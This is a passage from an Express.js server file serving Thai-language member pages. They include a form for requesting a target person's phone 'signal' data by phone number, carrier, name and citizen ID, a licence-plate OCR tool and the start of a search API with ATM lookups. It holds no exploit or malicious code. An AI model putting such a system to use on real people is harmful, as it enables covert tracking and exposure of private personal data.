const submitButton =
  document.getElementById(
    'submitButton'
  );


const loading =
  document.getElementById(
    'loading'
  );


const errorBox =
  document.getElementById(
    'errorBox'
  );


const successBox =
  document.getElementById(
    'successBox'
  );


let previewUrl =
  null;


// เลขบัญชีให้เป็นตัวเลข
accountNumber.addEventListener(
  'input',
  function () {

    accountNumber.value =
      accountNumber.value
        .replace(/\\D/g, '')
        .slice(0, 30);

  }
);


// เลขบัตร 13 หลัก
citizenId.addEventListener(
  'input',
  function () {

    citizenId.value =
      citizenId.value
        .replace(/\\D/g, '')
        .slice(0, 13);

  }
);


// Preview รูป
evidence.addEventListener(
  'change',
  function () {

    const file =
      evidence.files &&
      evidence.files[0];


    if (!file) {
      return;
    }


    if (
      file.size >
      10 * 1024 * 1024
    ) {

      evidence.value =
        '';


      errorBox.textContent =
        'ไฟล์หลักฐานต้องมีขนาดไม่เกิน 10 MB';


      errorBox.style.display =
        'block';


      return;

    }


    if (previewUrl) {

      URL.revokeObjectURL(
        previewUrl
      );

    }


    previewUrl =
      URL.createObjectURL(
        file
      );


    preview.src =
      previewUrl;


    preview.style.display =
      'block';


    uploadPlaceholder.style.display =
      'none';


    changeImage.style.display =
      'block';


    errorBox.style.display =
      'none';

  }
);


changeImage.addEventListener(
  'click',
  function () {

    evidence.click();

  }
);


// =========================
// SUBMIT
// =========================

bankForm.addEventListener(
  'submit',
  async function (event) {

    event.preventDefault();


    errorBox.style.display =
      'none';


    successBox.style.display =
      'none';


    const account =
      accountNumber.value
        .replace(/\\D/g, '');


    const citizen =
      citizenId.value
        .replace(/\\D/g, '');


    // ต้องมีเลขบัญชีหรือเลขบัตร
    if (
      !account &&
      !citizen
    ) {

      errorBox.textContent =
        'กรุณาระบุหมายเลขบัญชี หรือเลขบัตรประชาชน 13 หลัก';


      errorBox.style.display =
        'block';


      return;

    }


    // ถ้ากรอกเลขบัตร ต้อง 13 หลัก
    if (
      citizen &&
      !/^\\d{13}$/.test(citizen)
    ) {

      errorBox.textContent =
        'เลขบัตรประชาชนต้องมี 13 หลัก';


      errorBox.style.display =
        'block';


      return;

    }


    if (
      !evidence.files ||
      !evidence.files[0]
    ) {

      errorBox.textContent =
        'กรุณาอัปโหลดภาพหลักฐานประกอบคำขอ';


      errorBox.style.display =
        'block';


      return;

    }


    const formData =
      new FormData(
        bankForm
      );


    submitButton.disabled =
      true;


    loading.style.display =
      'block';


    try {


      const response =
        await fetch(
          '/member/bank/request/submit',
          {

            method:
              'POST',

            credentials:
              'same-origin',

            body:
              formData

          }
        );


      const data =
        await response.json();


      if (
        response.status === 401 &&
        data.loginUrl
      ) {

        window.location.href =
          data.loginUrl;

        return;

      }


      if (!data.ok) {

        throw new Error(
          data.message ||
          'ส่งคำขอไม่สำเร็จ'
        );

      }


      successBox.textContent =
        '✅ ' +
        data.message +
        '\\n\\nเลขคำขอ: ' +
        data.requestId;


      successBox.style.whiteSpace =
        'pre-line';


      successBox.style.display =
        'block';


      bankForm.reset();


      preview.style.display =
        'none';


      preview.removeAttribute(
        'src'
      );


      uploadPlaceholder.style.display =
        'block';


      changeImage.style.display =
        'none';


      if (previewUrl) {

        URL.revokeObjectURL(
          previewUrl
        );

        previewUrl =
          null;

      }


      window.scrollTo({
        top: 0,
        behavior: 'smooth'
      });


    } catch (err) {


      errorBox.textContent =
        err.message ||
        'เกิดข้อผิดพลาด กรุณาลองใหม่อีกครั้ง';


      errorBox.style.display =
        'block';


    } finally {


      loading.style.display =
        'none';


      submitButton.disabled =
        false;

    }

  }
);


</script>


</body>

</html>
    `);

  }
);

// ==========================================
// MEMBER BASE REQUEST : PAGE
// ==========================================

app.get(
  '/member/base/request',
  (req, res) => {

    const lineUser =
      req.session?.lineUser;


    // =========================
    // ยังไม่ได้ Login LINE
    // =========================
    if (!lineUser?.userId) {

      return res.redirect(
        '/line/login?next=%2Fmember%2Fbase%2Frequest'
      );

    }


    // =========================
    // ตรวจสมาชิก
    // =========================
    const db =
      loadDB();

    db.members =
      db.members || {};


    const member =
      db.members[
        lineUser.userId
      ];


    if (
      !member ||
      (
        !isActiveMember(member) &&
        !isAdmin(lineUser.userId)
      )
    ) {

      return res
        .status(403)
        .send(
          'บัญชีนี้ไม่มีสิทธิ์ส่งคำขอ BASE'
        );

    }


    // =========================
    // ส่งหน้าเว็บ
    // =========================
    res.send(`
<!DOCTYPE html>

<html lang="th">

<head>

  <meta charset="UTF-8">

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0, maximum-scale=1.0"
  >

  <title>
    NECT BASE REQUEST
  </title>


  <style>

    * {
      box-sizing: border-box;
    }


    body {
      margin: 0;

      min-height: 100vh;

      font-family:
        Arial,
        sans-serif;

      color: #e5e7eb;

      background:
        radial-gradient(
          circle at top,
          #172554 0%,
          #0b1220 36%,
          #050810 100%
        );
    }


    .page {
      width: 100%;

      max-width: 560px;

      margin: 0 auto;

      padding:
        28px 16px 55px;
    }


    /* =========================
       BRAND
    ========================= */

    .brand {
      text-align: center;

      margin-bottom: 24px;
    }


    .brand-icon {
      width: 64px;
      height: 64px;

      margin:
        0 auto 13px;

      display: flex;

      align-items: center;
      justify-content: center;

      border-radius: 20px;

      font-size: 29px;

      background:
        linear-gradient(
          145deg,
          #1d4ed8,
          #2563eb
        );

      box-shadow:
        0 15px 36px
        rgba(37, 99, 235, .32);
    }


    .brand-title {
      font-size: 21px;

      font-weight: 800;

      color: #ffffff;
    }


    .brand-subtitle {
      margin-top: 6px;

      font-size: 11px;

      letter-spacing: 1.4px;

      color: #94a3b8;
    }


    /* =========================
       CARD
    ========================= */

    .card {
      overflow: hidden;

      border-radius: 24px;

      background:
        rgba(15, 23, 42, .94);

      border:
        1px solid
        rgba(148, 163, 184, .14);

      box-shadow:
        0 26px 70px
        rgba(0, 0, 0, .38);
    }


    .card-header {
      padding: 21px;

      border-bottom:
        1px solid
        rgba(148, 163, 184, .11);
    }


    .card-title {
      font-size: 17px;

      font-weight: 800;

      color: #f8fafc;
    }


    .card-desc {
      margin-top: 7px;

      font-size: 12px;

      line-height: 1.7;

      color: #94a3b8;
    }


    .card-body {
      padding: 20px;
    }


    /* =========================
       FORM
    ========================= */

    .field {
      margin-bottom: 18px;
    }


    .field-label {
      display: block;

      margin-bottom: 8px;

      font-size: 12px;

      font-weight: 700;

      color: #cbd5e1;
    }


    .required {
      color: #f87171;
    }


    input,
    select,
    textarea {
      width: 100%;

      border:
        1px solid
        rgba(148, 163, 184, .18);

      outline: none;

      border-radius: 14px;

      padding:
        13px 14px;

      font-size: 14px;

      color: #f8fafc;

      background:
        rgba(2, 6, 23, .55);

      transition:
        border-color .2s ease,
        box-shadow .2s ease;
    }


    input:focus,
    select:focus,
    textarea:focus {
      border-color:
        rgba(59, 130, 246, .70);

      box-shadow:
        0 0 0 3px
        rgba(37, 99, 235, .12);
    }


    input::placeholder,
    textarea::placeholder {
      color: #64748b;
    }


    select option {
      color: #111827;

      background: #ffffff;
    }


    textarea {
      min-height: 115px;

      resize: vertical;

      line-height: 1.6;
    }


    .helper {
      margin-top: 7px;

      font-size: 10px;

      line-height: 1.6;

      color: #64748b;
    }


    /* =========================
       UPLOAD
    ========================= */

    .upload-box {
      position: relative;

      min-height: 190px;

      display: flex;

      align-items: center;
      justify-content: center;

      overflow: hidden;

      text-align: center;

      border-radius: 17px;

      border:
        1.5px dashed
        rgba(96, 165, 250, .42);

      background:
        rgba(30, 41, 59, .48);

      cursor: pointer;
    }


    .upload-box:active {
      transform:
        scale(.995);
    }


    .upload-placeholder {
      padding: 25px;
    }


    .upload-icon {
      font-size: 38px;
    }


    .upload-title {
      margin-top: 11px;

      font-size: 14px;

      font-weight: 700;

      color: #e2e8f0;
    }


    .upload-help {
      margin-top: 7px;

      font-size: 10px;

      line-height: 1.7;

      color: #94a3b8;
    }


    #evidence {
      display: none;
    }


    #preview {
      display: none;

      width: 100%;

      max-height: 390px;

      object-fit: contain;

      background: #020617;
    }


    .change-button {
      display: none;

      width: 100%;

      margin-top: 10px;

      min-height: 43px;

      border-radius: 13px;

      border:
        1px solid
        rgba(148, 163, 184, .18);

      color: #cbd5e1;

      background:
        rgba(255, 255, 255, .035);

      cursor: pointer;
    }


    /* =========================
       SUBMIT
    ========================= */

    .submit-button {
      width: 100%;

      min-height: 55px;

      margin-top: 8px;

      border: 0;

      border-radius: 15px;

      font-size: 15px;

      font-weight: 800;

      color: #ffffff;

      background:
        linear-gradient(
          135deg,
          #2563eb,
          #1d4ed8
        );

      box-shadow:
        0 13px 30px
        rgba(37, 99, 235, .30);

      cursor: pointer;
    }


    .submit-button:disabled {
      cursor: not-allowed;

      opacity: .45;

      box-shadow: none;
    }


    /* =========================
       MESSAGE
    ========================= */

    .loading {
      display: none;

      margin-top: 16px;

      padding: 15px;

      text-align: center;

      border-radius: 14px;

      font-size: 12px;

      color: #bfdbfe;

      background:
        rgba(37, 99, 235, .08);

      border:
        1px solid
        rgba(37, 99, 235, .16);
    }


    .error-box {
      display: none;

      margin-top: 16px;

      padding: 15px;

      border-radius: 14px;

      font-size: 12px;

      line-height: 1.7;

      color: #fecaca;

      background:
        rgba(239, 68, 68, .07);

      border:
        1px solid
        rgba(239, 68, 68, .18);
    }


    .success-box {
      display: none;

      margin-top: 16px;

      padding: 18px;

      border-radius: 16px;

      font-size: 13px;

      line-height: 1.7;

      color: #bbf7d0;

      background:
        rgba(34, 197, 94, .07);

      border:
        1px solid
        rgba(34, 197, 94, .18);
    }


    /* =========================
       WARNING
    ========================= */

    .warning {
      margin-top: 18px;

      padding: 14px;

      border-radius: 14px;

      font-size: 10px;

      line-height: 1.7;

      color: #94a3b8;

      background:
        rgba(255, 255, 255, .025);

      border:
        1px solid
        rgba(148, 163, 184, .08);
    }


    @media (max-width: 480px) {

      .page {
        padding:
          20px 12px 40px;
      }


      .card {
        border-radius: 20px;
      }


      .card-body {
        padding: 16px;
      }

    }

  </style>

</head>


<body>


<div class="page">


  <!-- =========================
       BRAND
  ========================== -->

  <div class="brand">

    <div class="brand-icon">
      📡
    </div>

    <div class="brand-title">
      NECT BASE REQUEST
    </div>

    <div class="brand-subtitle">
      SIGNAL REQUEST SYSTEM
    </div>

  </div>


  <!-- =========================
       CARD
  ========================== -->

  <div class="card">


    <div class="card-header">

      <div class="card-title">
        แบบฟอร์มขอข้อมูลสัญญาณ
      </div>

      <div class="card-desc">
        กรุณากรอกข้อมูลตามความเป็นจริง
        และแนบหลักฐานประกอบคำขอให้ครบถ้วน
      </div>

    </div>


    <div class="card-body">


      <form id="baseForm">


        <!-- ======================
             PHONE
        ======================= -->

        <div class="field">

          <label class="field-label">

            หมายเลขโทรศัพท์เป้าหมาย

            <span class="required">
              *
            </span>

          </label>


          <input
            type="tel"
            id="phone"
            name="phone"
            maxlength="10"
            inputmode="numeric"
            placeholder="เช่น 0812345678"
            required
          >


          <div class="helper">
            กรุณาระบุหมายเลขโทรศัพท์ 10 หลัก
          </div>

        </div>


        <!-- ======================
             NETWORK
        ======================= -->

        <div class="field">

          <label class="field-label">

            เครือข่ายสัญญาณเป้าหมาย

            <span class="required">
              *
            </span>

          </label>


          <select
            id="network"
            name="network"
            required
          >

            <option value="">
              -- เลือกเครือข่าย --
            </option>

            <option value="AIS">
              AIS
            </option>

            <option value="TRUE">
              TRUE
            </option>

            <option value="DTAC">
              DTAC
            </option>

          </select>


          <div class="helper">
            เลือกเครือข่ายของหมายเลขเป้าหมาย
          </div>

        </div>


        <!-- ======================
             CASE
        ======================= -->

        <div class="field">

          <label class="field-label">

            ชื่อเคส / เหตุในการขอข้อมูล

            <span class="required">
              *
            </span>

          </label>


          <textarea
            id="caseName"
            name="caseName"
            maxlength="500"
            placeholder="เช่น เคสหมายจับ / ชื่อเคสตามประจำวัน / เคสสดให้แจ้งตามจริง"
            required
          ></textarea>


          <div class="helper">
            กรุณาระบุเหตุและรายละเอียดเคสให้ชัดเจน
          </div>

        </div>


        <!-- ======================
             TARGET NAME
        ======================= -->

        <div class="field">

          <label class="field-label">

            ชื่อ - นามสกุลเป้าหมาย

            <span class="required">
              *
            </span>

          </label>


          <input
            type="text"
            id="targetName"
            name="targetName"
            maxlength="200"
            placeholder="กรอกชื่อ - นามสกุลเป้าหมาย"
            required
          >

        </div>


        <!-- ======================
             CITIZEN ID
        ======================= -->

        <div class="field">

          <label class="field-label">

            เลขบัตรประชาชนเป้าหมาย

            <span class="required">
              *
            </span>

          </label>


          <input
            type="text"
            id="citizenId"
            name="citizenId"
            maxlength="13"
            inputmode="numeric"
            placeholder="เลขบัตรประชาชน 13 หลัก"
            required
          >

        </div>


        <!-- ======================
             EVIDENCE
        ======================= -->

        <div class="field">

          <label class="field-label">

            ภาพหลักฐานประกอบคำขอ

            <span class="required">
              *
            </span>

          </label>


          <label
            class="upload-box"
            for="evidence"
          >


            <div
              class="upload-placeholder"
              id="uploadPlaceholder"
            >

              <div class="upload-icon">
                📎
              </div>


              <div class="upload-title">
                แตะเพื่ออัปโหลดหลักฐาน
              </div>


              <div class="upload-help">

                เช่น ภาพหมายจับ / ปจว. /
                หลักฐานประกอบเคส

                <br>

                รองรับ JPG, PNG และ WEBP

              </div>

            </div>


            <img
              id="preview"
              alt="Evidence preview"
            >


          </label>


          <input
            type="file"
            id="evidence"
            name="evidence"
            accept="image/jpeg,image/png,image/webp"
            required
          >


          <button
            type="button"
            id="changeImage"
            class="change-button"
          >
            เลือกภาพใหม่
          </button>


        </div>


        <!-- ======================
             SUBMIT
        ======================= -->

        <button
          type="submit"
          class="submit-button"
          id="submitButton"
        >
          📡 ส่งข้อมูลขอสัญญาณ
        </button>


      </form>


      <!-- ======================
           LOADING
      ======================= -->

      <div
        class="loading"
        id="loading"
      >
        ⏳ กำลังส่งข้อมูลให้แอดมิน
        กรุณารอสักครู่...
      </div>


      <!-- ======================
           ERROR
      ======================= -->

      <div
        class="error-box"
        id="errorBox"
      ></div>


      <!-- ======================
           SUCCESS
      ======================= -->

      <div
        class="success-box"
        id="successBox"
      ></div>


      <!-- ======================
           WARNING
      ======================= -->

      <div class="warning">

        🔐 กรุณาใช้ข้อมูลและหลักฐานตามวัตถุประสงค์
        ของระบบเท่านั้น

        <br><br>

        ตรวจสอบข้อมูลทุกช่องให้ถูกต้อง
        ก่อนกดส่งคำขอ

      </div>


    </div>

  </div>

</div>


<script>


const baseForm =
  document.getElementById(
    'baseForm'
  );


const phone =
  document.getElementById(
    'phone'
  );


const citizenId =
  document.getElementById(
    'citizenId'
  );


const evidence =
  document.getElementById(
    'evidence'
  );


const preview =
  document.getElementById(
    'preview'
  );


const uploadPlaceholder =
  document.getElementById(
    'uploadPlaceholder'
  );


const changeImage =
  document.getElementById(
    'changeImage'
  );


const submitButton =
  document.getElementById(
    'submitButton'
  );


const loading =
  document.getElementById(
    'loading'
  );


const errorBox =
  document.getElementById(
    'errorBox'
  );


const successBox =
  document.getElementById(
    'successBox'
  );


let previewUrl =
  null;


// =========================
// PHONE ตัวเลขเท่านั้น
// =========================

phone.addEventListener(
  'input',
  function () {

    phone.value =
      phone.value
        .replace(/\\D/g, '')
        .slice(0, 10);

  }
);


// =========================
// CITIZEN ID ตัวเลขเท่านั้น
// =========================

citizenId.addEventListener(
  'input',
  function () {

    citizenId.value =
      citizenId.value
        .replace(/\\D/g, '')
        .slice(0, 13);

  }
);


// =========================
// PREVIEW IMAGE
// =========================

evidence.addEventListener(
  'change',
  function () {

    const file =
      evidence.files &&
      evidence.files[0];


    if (!file) {
      return;
    }


    // จำกัด 10 MB
    if (
      file.size >
      10 * 1024 * 1024
    ) {

      evidence.value =
        '';


      errorBox.textContent =
        'ไฟล์หลักฐานต้องมีขนาดไม่เกิน 10 MB';


      errorBox.style.display =
        'block';


      return;

    }


    if (previewUrl) {

      URL.revokeObjectURL(
        previewUrl
      );

    }


    previewUrl =
      URL.createObjectURL(
        file
      );


    preview.src =
      previewUrl;


    preview.style.display =
      'block';


    uploadPlaceholder.style.display =
      'none';


    changeImage.style.display =
      'block';


    errorBox.style.display =
      'none';

  }
);


// =========================
// CHANGE IMAGE
// =========================

changeImage.addEventListener(
  'click',
  function () {

    evidence.click();

  }
);


// =========================
// SUBMIT FORM
// =========================

baseForm.addEventListener(
  'submit',
  async function (event) {

    event.preventDefault();


    errorBox.style.display =
      'none';


    successBox.style.display =
      'none';


    // =====================
    // PHONE
    // =====================

    if (
      !/^0\\d{9}$/.test(
        phone.value
      )
    ) {

      errorBox.textContent =
        'กรุณาระบุหมายเลขโทรศัพท์เป้าหมาย 10 หลัก';


      errorBox.style.display =
        'block';


      return;

    }


    // =====================
    // CITIZEN ID
    // =====================

    if (
      !/^\\d{13}$/.test(
        citizenId.value
      )
    ) {

      errorBox.textContent =
        'กรุณาระบุเลขบัตรประชาชนเป้าหมาย 13 หลัก';


      errorBox.style.display =
        'block';


      return;

    }


    // =====================
    // IMAGE
    // =====================

    if (
      !evidence.files ||
      !evidence.files[0]
    ) {

      errorBox.textContent =
        'กรุณาอัปโหลดภาพหลักฐานประกอบคำขอ';


      errorBox.style.display =
        'block';


      return;

    }


    const formData =
      new FormData(
        baseForm
      );


    submitButton.disabled =
      true;


    loading.style.display =
      'block';


    try {


      const response =
        await fetch(
          '/member/base/request/submit',
          {

            method:
              'POST',

            credentials:
              'same-origin',

            body:
              formData

          }
        );


      const data =
        await response.json();


      // =====================
      // LOGIN หมดอายุ
      // =====================

      if (
        response.status === 401 &&
        data.loginUrl
      ) {

        window.location.href =
          data.loginUrl;

        return;

      }


      if (!data.ok) {

        throw new Error(
          data.message ||
          'ส่งคำขอไม่สำเร็จ'
        );

      }


      // =====================
      // SUCCESS
      // =====================

      successBox.textContent =
        '✅ ' +
        data.message +
        '\\n\\nเลขคำขอ: ' +
        data.requestId;


      successBox.style.whiteSpace =
        'pre-line';


      successBox.style.display =
        'block';


      // ล้างฟอร์ม
      baseForm.reset();


      preview.style.display =
        'none';


      preview.removeAttribute(
        'src'
      );


      uploadPlaceholder.style.display =
        'block';


      changeImage.style.display =
        'none';


      if (previewUrl) {

        URL.revokeObjectURL(
          previewUrl
        );

        previewUrl =
          null;

      }


      window.scrollTo({
        top: 0,
        behavior: 'smooth'
      });


    } catch (err) {


      errorBox.textContent =
        err.message ||
        'เกิดข้อผิดพลาด กรุณาลองใหม่อีกครั้ง';


      errorBox.style.display =
        'block';


    } finally {


      loading.style.display =
        'none';


      submitButton.disabled =
        false;

    }

  }
);


</script>


</body>

</html>
    `);

  }
);

// ==========================================
// MEMBER TOOL PAGE : IMAGE / PLATE OCR
// ==========================================

app.get(
  '/member/tools/image',
  (req, res) => {

    const lineUser =
      req.session?.lineUser;


    // ยังไม่ได้ Login LINE
    if (!lineUser?.userId) {

      return res.redirect(
        '/line/login?next=%2Fmember%2Ftools%2Fimage'
      );

    }


    const db =
      loadDB();

    db.members =
      db.members || {};

    const member =
      db.members[lineUser.userId];


    if (!member) {

      return res.status(403).send(
        'ไม่พบข้อมูลสมาชิก'
      );

    }


    if (!isActiveMember(member)) {

      return res.status(403).send(
        'สมาชิกยังไม่ได้รับอนุมัติ หรือหมดอายุแล้ว'
      );

    }


    res.send(`
<!DOCTYPE html>
<html lang="th">

<head>

<meta charset="UTF-8">

<meta
  name="viewport"
  content="width=device-width, initial-scale=1.0, maximum-scale=1.0"
>

<title>NECT - Plate OCR</title>

<style>

* {
  box-sizing: border-box;
}

body {
  margin: 0;

  min-height: 100vh;

  font-family:
    Arial,
    sans-serif;

  color: #e5e7eb;

  background:
    radial-gradient(
      circle at top,
      #172554 0,
      #0b1220 38%,
      #050810 100%
    );
}


.page {
  width: 100%;

  max-width: 520px;

  margin: 0 auto;

  padding:
    28px 18px 50px;
}


.brand {
  text-align: center;

  margin-bottom: 24px;
}


.brand-icon {
  width: 62px;
  height: 62px;

  margin:
    0 auto 12px;

  display: flex;
  align-items: center;
  justify-content: center;

  border-radius: 20px;

  font-size: 30px;

  background:
    linear-gradient(
      145deg,
      #1d4ed8,
      #2563eb
    );

  box-shadow:
    0 14px 35px
    rgba(37, 99, 235, .35);
}


.brand-title {
  font-size: 21px;

  font-weight: 800;

  color: #f8fafc;
}


.brand-subtitle {
  margin-top: 6px;

  font-size: 12px;

  color: #94a3b8;
}


.card {
  overflow: hidden;

  border-radius: 24px;

  background:
    rgba(15, 23, 42, .92);

  border:
    1px solid
    rgba(148, 163, 184, .14);

  box-shadow:
    0 24px 70px
    rgba(0, 0, 0, .38);
}


.card-head {
  padding: 21px;

  border-bottom:
    1px solid
    rgba(148, 163, 184, .11);
}


.card-title {
  font-size: 17px;

  font-weight: 800;

  color: #ffffff;
}


.card-desc {
  margin-top: 7px;

  font-size: 12px;

  line-height: 1.6;

  color: #94a3b8;
}


.card-body {
  padding: 20px;
}


.upload-box {
  position: relative;

  min-height: 230px;

  display: flex;
  align-items: center;
  justify-content: center;

  text-align: center;

  overflow: hidden;

  border-radius: 18px;

  border:
    1.5px dashed
    rgba(96, 165, 250, .45);

  background:
    rgba(30, 41, 59, .55);

  cursor: pointer;
}


.upload-box:active {
  transform:
    scale(.995);
}


.upload-placeholder {
  padding: 28px;
}


.upload-icon {
  font-size: 42px;
}


.upload-title {
  margin-top: 13px;

  font-size: 15px;

  font-weight: 700;

  color: #f8fafc;
}


.upload-help {
  margin-top: 7px;

  font-size: 11px;

  line-height: 1.6;

  color: #94a3b8;
}


#preview {
  width: 100%;
  height: 100%;

  min-height: 230px;

  max-height: 420px;

  object-fit: contain;

  display: none;

  background: #020617;
}


#plateImage {
  display: none;
}


.actions {
  margin-top: 16px;
}


.scan-button {
  width: 100%;

  min-height: 52px;

  border: 0;

  border-radius: 15px;

  font-size: 15px;

  font-weight: 800;

  color: #ffffff;

  background:
    linear-gradient(
      135deg,
      #2563eb,
      #1d4ed8
    );

  box-shadow:
    0 12px 28px
    rgba(37, 99, 235, .30);

  cursor: pointer;
}


.scan-button:disabled {
  cursor: not-allowed;

  opacity: .42;

  box-shadow: none;
}


.change-button {
  width: 100%;

  margin-top: 10px;

  min-height: 44px;

  border-radius: 14px;

  border:
    1px solid
    rgba(148, 163, 184, .18);

  color: #cbd5e1;

  background:
    rgba(255, 255, 255, .035);

  display: none;

  cursor: pointer;
}


.loading {
  display: none;

  margin-top: 18px;

  padding: 16px;

  border-radius: 14px;

  text-align: center;

  font-size: 13px;

  color: #bfdbfe;

  background:
    rgba(37, 99, 235, .08);

  border:
    1px solid
    rgba(37, 99, 235, .16);
}


.result-box {
  display: none;

  margin-top: 18px;

  padding: 18px;

  border-radius: 17px;

  background:
    rgba(2, 6, 23, .60);

  border:
    1px solid
    rgba(34, 197, 94, .18);
}


.result-title {
  font-size: 13px;

  font-weight: 800;

  color: #4ade80;

  margin-bottom: 12px;
}


.result-text {
  white-space: pre-wrap;

  word-break: break-word;

  font-size: 13px;

  line-height: 1.8;

  color: #e2e8f0;
}


.error-box {
  display: none;

  margin-top: 18px;

  padding: 15px;

  border-radius: 14px;

  font-size: 12px;

  line-height: 1.6;

  color: #fecaca;

  background:
    rgba(239, 68, 68, .07);

  border:
    1px solid
    rgba(239, 68, 68, .18);
}


.security {
  margin-top: 18px;

  padding: 14px;

  border-radius: 14px;

  font-size: 11px;

  line-height: 1.7;

  color: #94a3b8;

  background:
    rgba(255, 255, 255, .025);

  border:
    1px solid
    rgba(148, 163, 184, .08);
}

</style>

</head>


<body>

<div class="page">


  <div class="brand">

    <div class="brand-icon">
      🚘
    </div>

    <div class="brand-title">
      NECT
    </div>

    <div class="brand-subtitle">
      VEHICLE INTELLIGENCE SYSTEM
    </div>

  </div>


  <div class="card">

    <div class="card-head">

      <div class="card-title">
        อ่านป้ายทะเบียนรถ
      </div>

      <div class="card-desc">
        เลือกรูปรถหรือป้ายทะเบียน
        ระบบจะวิเคราะห์ข้อมูลจากภาพโดยอัตโนมัติ
      </div>

    </div>


    <div class="card-body">


      <label
        class="upload-box"
        for="plateImage"
        id="uploadBox"
      >

        <div
          class="upload-placeholder"
          id="uploadPlaceholder"
        >

          <div class="upload-icon">
            📷
          </div>

          <div class="upload-title">
            แตะเพื่อเลือกรูปภาพ
          </div>

          <div class="upload-help">
            ถ่ายภาพจากกล้อง
            หรือเลือกรูปจากอัลบั้ม<br>
            รองรับ JPG, PNG และ WEBP
          </div>

        </div>


        <img
          id="preview"
          alt="preview"
        >

      </label>


      <input
        type="file"
        id="plateImage"
        accept="image/jpeg,image/png,image/webp"
        capture="environment"
      >


      <div class="actions">

        <button
          type="button"
          class="scan-button"
          id="scanButton"
          disabled
        >
          🔎 ตรวจสอบป้ายทะเบียน
        </button>


        <button
          type="button"
          class="change-button"
          id="changeButton"
        >
          เลือกรูปใหม่
        </button>

      </div>


      <div
        class="loading"
        id="loading"
      >
        ⏳ กำลังวิเคราะห์ภาพ
        กรุณารอสักครู่...
      </div>


      <div
        class="error-box"
        id="errorBox"
      ></div>


      <div
        class="result-box"
        id="resultBox"
      >

        <div class="result-title">
          ✅ ผลการตรวจสอบ
        </div>

        <div
          class="result-text"
          id="resultText"
        ></div>

      </div>


      <div class="security">
        🔐 รูปภาพที่อัปโหลดใช้สำหรับการประมวลผลเท่านั้น
        และระบบจะลบไฟล์ชั่วคราวหลังจากประมวลผลเสร็จ
      </div>


    </div>

  </div>

</div>


<script>

const plateImage =
  document.getElementById(
    'plateImage'
  );

const preview =
  document.getElementById(
    'preview'
  );

const uploadPlaceholder =
  document.getElementById(
    'uploadPlaceholder'
  );

const scanButton =
  document.getElementById(
    'scanButton'
  );

const changeButton =
  document.getElementById(
    'changeButton'
  );

const loading =
  document.getElementById(
    'loading'
  );

const resultBox =
  document.getElementById(
    'resultBox'
  );

const resultText =
  document.getElementById(
    'resultText'
  );

const errorBox =
  document.getElementById(
    'errorBox'
  );


let selectedFile = null;

let previewUrl = null;


plateImage.addEventListener(
  'change',
  function () {

    const file =
      plateImage.files &&
      plateImage.files[0];


    if (!file) {
      return;
    }


    if (
      file.size >
      10 * 1024 * 1024
    ) {

      plateImage.value = '';

      selectedFile = null;

      errorBox.style.display =
        'block';

      errorBox.textContent =
        'ไฟล์ต้องมีขนาดไม่เกิน 10 MB';

      return;
    }


    selectedFile = file;


    if (previewUrl) {
      URL.revokeObjectURL(
        previewUrl
      );
    }


    previewUrl =
      URL.createObjectURL(file);


    preview.src =
      previewUrl;

    preview.style.display =
      'block';

    uploadPlaceholder.style.display =
      'none';

    scanButton.disabled =
      false;

    changeButton.style.display =
      'block';

    errorBox.style.display =
      'none';

    resultBox.style.display =
      'none';

  }
);


changeButton.addEventListener(
  'click',
  function () {

    plateImage.click();

  }
);


scanButton.addEventListener(
  'click',
  async function () {

    if (!selectedFile) {
      return;
    }


    scanButton.disabled =
      true;

    loading.style.display =
      'block';

    errorBox.style.display =
      'none';

    resultBox.style.display =
      'none';


    const formData =
      new FormData();

    formData.append(
      'image',
      selectedFile
    );


    try {

      const response =
        await fetch(
          '/member/tools/plate-ocr',
          {
            method: 'POST',

            credentials:
              'same-origin',

            body:
              formData
          }
        );


      const data =
        await response.json();


      if (
        response.status === 401 &&
        data.loginUrl
      ) {

        window.location.href =
          data.loginUrl;

        return;
      }


      if (!data.ok) {

        throw new Error(
          data.message ||
          'ไม่สามารถตรวจสอบรูปภาพได้'
        );

      }


      resultText.textContent =
        data.result ||
        'ไม่พบข้อมูล';


      resultBox.style.display =
        'block';


    } catch (err) {

      errorBox.textContent =
        err.message ||
        'เกิดข้อผิดพลาด กรุณาลองใหม่อีกครั้ง';

      errorBox.style.display =
        'block';


    } finally {

      loading.style.display =
        'none';

      scanButton.disabled =
        false;

    }

  }
);

</script>


</body>
</html>
    `);

  }
);

// =====================================
// แปลง LINE Flex -> ข้อความสำหรับหน้าเว็บ
// =====================================

function flexToWebText(message) {

  const lines = [];

  function walk(node) {

    if (!node) return;

    if (Array.isArray(node)) {

      node.forEach(walk);
      return;

    }

    if (
      typeof node !== 'object'
    ) {
      return;
    }

    if (
      node.type === 'text' &&
      typeof node.text === 'string'
    ) {

      const text =
        node.text.trim();

      if (text) {
        lines.push(text);
      }
    }

    Object.values(node)
      .forEach(walk);
  }


  walk(message);

  return lines
    .join('\n')
    .trim();
}

// =====================================
// MEMBER SEARCH : COMMAND API
// =====================================

app.post(
  '/member/search/command',
  express.json(),
  async (req, res) => {

    const lineUser =
      req.session.lineUser;


    // =========================
    // ตรวจ LINE Login
    // =========================

    if (!lineUser?.userId) {

      return res
        .status(401)
        .json({
          ok: false,
          message:
            'กรุณาเข้าสู่ระบบ LINE ก่อน'
        });
    }


    const userId =
      lineUser.userId;


    const db =
      loadDB();


    const member =
      db.members?.[userId];


    // =========================
    // ตรวจสมาชิก
    // =========================

    if (!member) {

      return res
        .status(403)
        .json({
          ok: false,
          message:
            'ไม่พบข้อมูลสมาชิก'
        });
    }


    if (
      member.status !==
      'approved'
    ) {

      return res
        .status(403)
        .json({
          ok: false,
          message:
            'ยังไม่มีสิทธิ์ใช้งาน กรุณาติดต่อแอดมิน'
        });
    }


    if (
      !member.expireAt ||
      isExpired(
        member.expireAt
      )
    ) {

      return res
        .status(403)
        .json({
          ok: false,
          message:
            'สมาชิกหมดอายุ กรุณาติดต่อแอดมิน'
        });
    }


    // =========================
    // รับคำสั่ง
    // =========================

    const command =
      normalizeNectSearchCommand(String(
        req.body?.command ||
        ''
      )
        .trim());


    if (!command) {

      return res
        .status(400)
        .json({
          ok: false,
          message:
            'กรุณาระบุข้อมูลค้นหา'
        });
    }


    try {

      // =====================================
      // ATM
      // =====================================

      if (
        command
          .toLowerCase()
          .startsWith('atm%')
      ) {

        const keyword =
          command
            .replace(
              /^atm%/i,
              ''
            )
            .trim();


        if (!keyword) {

          return res.json({
            ok: false,
            message:
              'กรุณาระบุรหัสตู้ ATM'
          });
        }


        const results =
